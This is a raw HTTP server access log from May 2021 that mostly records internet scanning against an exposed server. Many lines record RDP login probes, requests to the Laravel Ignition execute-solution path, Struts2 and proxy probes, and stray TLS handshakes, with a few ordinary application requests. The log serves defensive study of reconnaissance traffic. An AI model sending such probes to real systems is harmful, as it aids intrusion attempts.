192.241.210.29 - - [22/May/2021 22:58:48] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03-Gà±¹×¤o1\x87ÆXI\x84²]\x9c\x10#E{o\x96ÿ\x9dÁáLúèCY\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
192.241.210.29 - - [22/May/2021 22:58:48] "[35m[1m   -Gà±¹×¤o1ÆXI²]#E{oÿÁáLúèCY  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [22/May/2021 23:33:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [22/May/2021 23:33:52] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [23/May/2021 00:25:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 00:25:29] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
8.129.1.203 - - [23/May/2021 01:56:32] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
121.5.250.245 - - [23/May/2021 08:34:32] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [23/May/2021 10:26:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 10:26:26] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
180.149.125.175 - - [23/May/2021 11:23:11] "[33mGET /c/ HTTP/1.1[0m" 404 -
49.84.202.110 - - [23/May/2021 12:08:55] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
49.84.202.110 - - [23/May/2021 12:08:55] "[35m[1m    c                           [0m" HTTPStatus.BAD_REQUEST -
65.49.20.69 - - [23/May/2021 14:36:42] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [23/May/2021 16:19:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 16:19:04] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [23/May/2021 16:36:50] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [23/May/2021 16:36:50] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [23/May/2021 16:50:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [23/May/2021 16:50:16] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
128.199.29.172 - - [23/May/2021 17:12:15] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
47.241.193.60 - - [23/May/2021 18:39:39] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [23/May/2021 18:39:54] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [23/May/2021 18:39:54] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
150.255.82.139 - - [23/May/2021 18:39:58] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
150.255.82.139 - - [23/May/2021 18:39:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [23/May/2021 18:40:03] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [23/May/2021 18:40:03] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
180.149.125.175 - - [23/May/2021 21:31:41] "[33mGET / HTTP/1.1[0m" 404 -
125.64.94.144 - - [23/May/2021 22:42:32] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
125.64.94.144 - - [23/May/2021 22:42:32] "[35m[1m\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E[0m" HTTPStatus.BAD_REQUEST -
106.75.211.111 - - [23/May/2021 23:18:58] "[33mGET http://www.qq.com/404/search_children.js HTTP/1.1[0m" 404 -
106.75.211.111 - - [23/May/2021 23:19:08] code 400, message Bad request syntax ('\x05\x01\x00')
106.75.211.111 - - [23/May/2021 23:19:08] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
106.75.211.111 - - [23/May/2021 23:19:08] code 400, message Bad request syntax ('\x04\x01\x00PpTi4\x00')
106.75.211.111 - - [23/May/2021 23:19:08] "[35m[1m PpTi4 [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [24/May/2021 00:04:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 00:04:13] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.118.53.194 - - [24/May/2021 00:07:34] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [24/May/2021 02:04:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 02:04:33] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
118.126.124.74 - - [24/May/2021 03:01:39] "[33mGET /struts2-rest-showcase/orders.xhtml HTTP/1.1[0m" 404 -
74.120.14.56 - - [24/May/2021 05:20:30] "[33mGET / HTTP/1.1[0m" 404 -
192.241.212.84 - - [24/May/2021 08:10:48] code 400, message Bad request version ('À\x14À')
192.241.212.84 - - [24/May/2021 08:10:48] "[35m[1m   0Ùµ4çÃORT©xÙpÒÞ/AMîi¿ÙÄÈ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
122.228.19.80 - - [24/May/2021 08:21:19] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
122.228.19.80 - - [24/May/2021 08:21:19] "[35m[1m   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
113.57.237.24 - - [24/May/2021 11:40:38] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:40:38] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:40:40] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:45:34] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:45:34] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:46:07] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:47:52] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:47:52] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:54:05] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:54:05] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:57:51] "[37mOPTIONS /logout HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:57:51] "[37mPOST /logout HTTP/1.1[0m" 200 -
45.155.205.209 - - [24/May/2021 14:02:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 14:02:48] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.54 - - [24/May/2021 14:16:49] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.54 - - [24/May/2021 14:16:50] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.141 - - [24/May/2021 15:45:36] "[33mGET / HTTP/1.1[0m" 404 -
47.241.193.60 - - [24/May/2021 15:48:39] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [24/May/2021 15:49:40] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [24/May/2021 15:49:40] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
220.200.163.188 - - [24/May/2021 15:49:44] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
220.200.163.188 - - [24/May/2021 15:49:44] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 15:49:57] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [24/May/2021 15:49:57] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [24/May/2021 15:55:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 15:55:32] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
128.199.201.142 - - [24/May/2021 16:34:10] "[33mGET / HTTP/1.0[0m" 404 -
64.62.197.182 - - [24/May/2021 16:54:46] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.5 - - [24/May/2021 18:24:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.5 - - [24/May/2021 18:24:40] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:34:59] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [24/May/2021 19:34:59] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:36:03] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [24/May/2021 19:36:03] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
36.5.197.146 - - [24/May/2021 19:36:08] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
36.5.197.146 - - [24/May/2021 19:36:08] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:36:18] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
69.162.84.99 - - [24/May/2021 20:46:28] "[33mHEAD / HTTP/1.0[0m" 404 -
45.155.205.209 - - [24/May/2021 23:59:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 23:59:24] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
80.82.70.168 - - [25/May/2021 01:23:00] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
80.82.70.168 - - [25/May/2021 01:23:00] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
80.82.70.168 - - [25/May/2021 01:23:01] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
80.82.70.168 - - [25/May/2021 01:23:01] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
143.107.216.77 - - [25/May/2021 01:45:55] "[33mGET / HTTP/1.1[0m" 404 -
143.107.216.77 - - [25/May/2021 01:45:56] "[33mGET /index.php HTTP/1.1[0m" 404 -
124.70.63.183 - - [25/May/2021 02:29:47] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [25/May/2021 03:24:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 03:24:48] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
162.142.125.37 - - [25/May/2021 04:07:40] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.37 - - [25/May/2021 04:07:40] "[33mGET / HTTP/1.1[0m" 404 -
45.95.98.11 - - [25/May/2021 05:33:30] "[33mCONNECT 192.30.255.113 HTTP/1.0[0m" 404 -
27.224.137.202 - - [25/May/2021 05:33:31] "[33mHEAD http://110.242.68.4/ HTTP/1.1[0m" 404 -
8.142.16.118 - - [25/May/2021 05:40:09] code 400, message Bad request syntax ('nil')
8.142.16.118 - - [25/May/2021 05:40:09] "[35m[1mnil[0m" HTTPStatus.BAD_REQUEST -
8.142.16.118 - - [25/May/2021 05:40:09] "[33mGET / HTTP/1.0[0m" 404 -
8.142.16.118 - - [25/May/2021 05:40:09] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.53 - - [25/May/2021 05:50:41] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.53 - - [25/May/2021 05:50:41] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [25/May/2021 06:58:30] "[33mHEAD / HTTP/1.0[0m" 404 -
185.202.2.149 - - [25/May/2021 07:12:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [25/May/2021 07:12:14] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
95.58.91.82 - - [25/May/2021 08:29:14] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.148.10.50 - - [25/May/2021 08:48:02] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [25/May/2021 12:48:03] "[33mHEAD / HTTP/1.0[0m" 404 -
192.241.205.252 - - [25/May/2021 12:55:34] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03\x11')
192.241.205.252 - - [25/May/2021 12:55:34] "[35m[1m   Ä× ô}DIÿèé*¾.V[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [25/May/2021 13:11:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [25/May/2021 13:11:53] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
43.252.230.219 - - [25/May/2021 13:53:29] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
43.252.230.219 - - [25/May/2021 13:53:29] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 14:51:42] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
161.189.134.11 - - [25/May/2021 14:51:42] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 14:54:58] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [25/May/2021 14:54:58] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:00:27] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [25/May/2021 15:00:27] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:08:50] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.134.11 - - [25/May/2021 15:08:50] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:12:59] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
161.189.134.11 - - [25/May/2021 15:12:59] "[35m[1m~   ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:15:48] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.192.94 - - [25/May/2021 15:15:48] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:19:27] code 400, message Bad HTTP/0.9 request type ('\x02¤Uÿ\x00\x00\x00')
161.189.134.11 - - [25/May/2021 15:19:27] "[35m[1m¤Uÿ   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:25:32] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
161.189.192.94 - - [25/May/2021 15:25:32] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:30:03] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [25/May/2021 15:30:03] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [25/May/2021 15:41:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [25/May/2021 15:41:05] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
91.241.19.56 - - [25/May/2021 16:06:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
91.241.19.56 - - [25/May/2021 16:06:24] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 16:43:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 16:43:11] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
43.252.230.219 - - [25/May/2021 18:39:46] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
43.252.230.219 - - [25/May/2021 18:39:46] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 19:23:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 19:23:53] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
203.159.80.30 - - [25/May/2021 19:34:12] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
203.159.80.30 - - [25/May/2021 19:34:12] "[35m[1mZ¥     [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 20:10:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 20:10:21] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.41 - - [25/May/2021 20:26:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.41 - - [25/May/2021 20:26:54] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
112.74.169.221 - - [25/May/2021 21:21:49] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
64.62.197.2 - - [25/May/2021 21:28:50] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [26/May/2021 00:28:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 00:28:59] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.41 - - [26/May/2021 01:14:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.41 - - [26/May/2021 01:14:06] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [26/May/2021 05:37:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [26/May/2021 05:37:57] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
91.90.213.175 - - [26/May/2021 07:21:33] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
91.241.19.56 - - [26/May/2021 08:34:10] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
91.241.19.56 - - [26/May/2021 08:34:10] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.220.205.196 - - [26/May/2021 09:40:32] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03Ûa^@¢ÉÐ,Ný6!óôp<\x85\x9f¶OÏ\x82\x08\x96m\x0bÎ!l\x90sw\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
185.220.205.196 - - [26/May/2021 09:40:32] "[35m[1m u  qÛa^@¢ÉÐ,Ný6!óôp<¶OÏmÎ!lsw  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:55] code 400, message Bad request syntax ('¿¿¯¯~\x00\x00\x00V\x10F)/kÞ\x19¡ßÏ\x86I³Ý\x94G')
204.48.27.138 - - [26/May/2021 10:58:55] "[35m[1m¿¿¯¯~   VF)/kÞ¡ßÏI³ÝG[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:55] "[33mPOST / HTTP/1.1[0m" 404 -
204.48.27.138 - - [26/May/2021 10:58:56] code 400, message Bad request syntax ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x007epYGsVmnUWyGup00jUT0goAAAAVirae')
204.48.27.138 - - [26/May/2021 10:58:56] "[35m[1me   Ø   7epYGsVmnUWyGup00jUT0goAAAAVirae[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:56] code 400, message Bad HTTP/0.9 request type ('\x17\x03\x01\x01\x04e\x00\x00\x00Ø\x00\x00\x005BE3E46C-1767-40AD-336BA00CEFB60\x00\x00\x00\x00B\x08Èc\x04ë\x99éIËH©{\x0f\x0fß\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00¨X7c\x14')
204.48.27.138 - - [26/May/2021 10:58:56] "[35m[1me   Ø   5BE3E46C-1767-40AD-336BA00CEFB60    BÈcëéIËH©{ß                                                        ¨X7c¹È33¸byÿ³¨·úØRâÈØßkòãýI[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:58] code 400, message Bad request syntax ('99Ì\x13ë\x8bUÀ!\x8biÈ\x96¥u2Þ\x8eºÕ\x8d\xa0°Ó|\x8fctWð\x00\x128E"®Ð+h\x85ÂVÑr\x19´D=B¦gÓrÇ\x9aÉ3¼\x07ÓqÃ×\x8a\x80Ï©¸>\x1bã\x8fYÕv\x92l\x88ª\x11\x83\x0e\x8d.¼9±Éö;\x84µ]\x9c\x02l\x1aMÈ(F¿\x83p4\x088\x7fÏ¶û¤÷k·ßÒÒx}sÜ]QçR\x96v\x9d *G_\x9fÈ\x16\x80\x04jt\x90Ù«(\x8d÷¯××äMw\x00lÇ6(¢bÊù|O]ò"\x04\x00ø#£f\tfÛQ6ÕzÓ¼Ú\x1a+wêç¤\x0bç×\x802ÔAêÐÒ´5ç\x8f\x92ÕµNØÌ¯ýL:K¸\x00\x0b0í\x9d¸è\x9d\x13\x97´é H-ÙYù´\x9bÜ³\x08\x98¤\x9eÕ\x99\x8eµ÷Í\x93\x89³¿5\x91\x9bRR?')
204.48.27.138 - - [26/May/2021 10:58:58] "[35m[1m99ÌëUÀ!iÈ¥u2ÞºÕ °Ó|ctWð 8E"®Ð+hÂVÑr´D=B¦gÓrÇÉ3¼ÓqÃ×Ï©¸>ãYÕvlª.¼9±Éö;µ]lMÈ(F¿p48Ï¶û¤÷k·ßÒÒx}sÜ]QçRv *G_ÈjtÙ«(÷¯××äMw lÇ6(¢bÊù|O]ò" ø#£f	fÛQ6ÕzÓ¼Ú+wêç¤ç×2ÔAêÐÒ´5çÕµNØÌ¯ýL:K¸ 0í¸è´é H-ÙYù´Ü³¤Õµ÷Í³¿5RR?[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:59:00] code 400, message Bad request syntax ('\x03UÐ2\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
204.48.27.138 - - [26/May/2021 10:59:00] "[35m[1mUÐ2                                                                                                                                                                                                                                                                [0m" HTTPStatus.BAD_REQUEST -
159.65.54.227 - - [26/May/2021 11:22:40] code 400, message Bad request syntax ('¿¿¯¯~\x00\x00\x00V\x10F)/kÞ\x19¡ßÏ\x86I³Ý\x94G')
159.65.54.227 - - [26/May/2021 11:22:40] "[35m[1m¿¿¯¯~   VF)/kÞ¡ßÏI³ÝG[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [26/May/2021 11:28:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 11:28:46] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
200.150.201.32 - - [26/May/2021 11:46:36] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
183.136.225.14 - - [26/May/2021 13:11:34] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [26/May/2021 13:11:34] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [26/May/2021 13:11:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
